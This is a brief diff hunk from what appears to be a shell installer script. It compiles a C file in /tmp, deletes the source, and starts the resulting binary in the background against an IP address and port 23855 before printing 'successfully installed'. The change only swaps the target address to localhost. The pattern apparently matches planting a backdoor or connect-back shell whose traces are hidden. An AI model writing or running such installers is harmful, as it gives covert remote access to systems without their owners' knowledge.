@@ -145,7 +145,7 @@ EOF
     gcc -o /tmp/desu /tmp/desu.c -ldl
     rm -f /tmp/desu.c
     chmod +x /tmp/desu
-    /tmp/desu 10.42.0.1 23855& 
+    /tmp/desu 127.0.0.1 23855& 
         
     echo "successfully installed"
     exit 0
